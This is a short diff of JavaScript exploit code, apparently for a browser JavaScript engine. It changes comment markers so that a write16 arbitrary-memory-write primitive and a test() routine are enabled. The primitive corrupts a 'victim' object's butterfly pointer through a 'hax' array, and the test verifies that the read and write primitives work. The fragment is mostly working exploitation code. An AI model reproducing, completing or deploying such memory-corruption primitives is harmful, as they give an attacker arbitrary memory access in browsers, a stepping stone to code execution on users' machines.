@@ -472,7 +472,7 @@ var print = (msg) => {
             victim.pointer = new Int64(int64);
         },
 
-        /*// Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
+        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
         write16(addr, value) {
             // Set butterfly of victim object and dereference.
             hax[1] = Add(new Int64(addr), 0x10).asDouble();
@@ -511,7 +511,7 @@ var print = (msg) => {
                 return arr;
             },
 
-        /* Verify that memory read and write primitives work.
+        //Verify that memory read and write primitives work.
         test() {
             var v = {};
             var obj = {p: v};
